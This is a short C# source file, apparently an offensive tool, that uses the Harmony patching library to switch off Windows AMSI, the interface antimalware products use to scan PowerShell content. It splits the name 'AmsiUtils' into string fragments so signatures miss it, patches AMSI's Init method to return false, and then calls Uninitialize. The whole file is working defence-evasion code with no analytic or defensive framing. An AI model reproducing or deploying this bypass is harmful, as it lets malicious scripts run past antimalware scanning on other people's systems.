
using System;
using System.Reflection;
using HarmonyLib;


public class TrollAmsi2
{
    public static void SmokeOut()
    {
        var harmony = new Harmony(" ");

        var theclass = Type.GetType("System.Ma" + "nage" + "ment.Auto" + "mation." + "A" + "m" + "s" + "i" + "U" + "t" + "i" + "l" + "s" + ", System.Management.Automation");        
        var themethodInit = theclass.GetMethod("Init", BindingFlags.Static | BindingFlags.NonPublic);

        var prefix = typeof(TrollAmsi2).GetMethod("Init", BindingFlags.Static | BindingFlags.NonPublic);
        harmony.Patch(themethodInit, prefix: new HarmonyMethod(prefix));

        var themethodUninitialize = theclass.GetMethod("Uninitialize", BindingFlags.Static | BindingFlags.NonPublic);
        themethodUninitialize.Invoke(null, null);
    }

    private static bool Init()
    {
        return false;
    }
}

